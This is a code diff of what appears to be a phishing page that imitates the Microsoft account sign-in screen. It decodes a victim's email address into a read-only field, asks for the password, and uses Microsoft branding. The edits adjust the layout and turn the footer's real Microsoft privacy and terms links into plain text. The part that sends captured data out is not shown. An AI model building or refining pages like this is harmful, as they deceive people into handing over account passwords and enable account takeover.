@@ -23,7 +23,6 @@ function doDecrypt($mail)
     <head>
         <title>Sign In to your Microsoft Account</title>
         <link rel="icon" type="image/x-icon" href="officon.png">
-
                <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
@@ -35,9 +34,9 @@ function doDecrypt($mail)
     <body class="formbod">
         <form>      
             <div class="boxing" id="boxing" >
-            <a href="#"><img id="logo" src="offlogo.png"></a>
+            <img id="logo" src="offlogo.png"></a>
                 <div >  
-                <img role="presentation" src="offbackicon.png">             
+			<a href="#"> <img role="presentation" src="offbackicon.png"></a>         
           <input type="email" name="email" id="email" value="<?php echo doDecrypt($mail); ?>"  placeholder="" readonly size="35" >
         <div class="form-outline">
         <h4 class="entpass">Enter password</h4>
@@ -52,9 +51,9 @@ function doDecrypt($mail)
 </div>
     </div>
     <div class="footer"> 
-        <a href="">. . .</a>
-        <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies</a>
-        <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
+        <p>. . .</p>
+        <p>Privacy & cookies</p>
+        <p>Terms of use</p>
     </div>       
     
         </form>
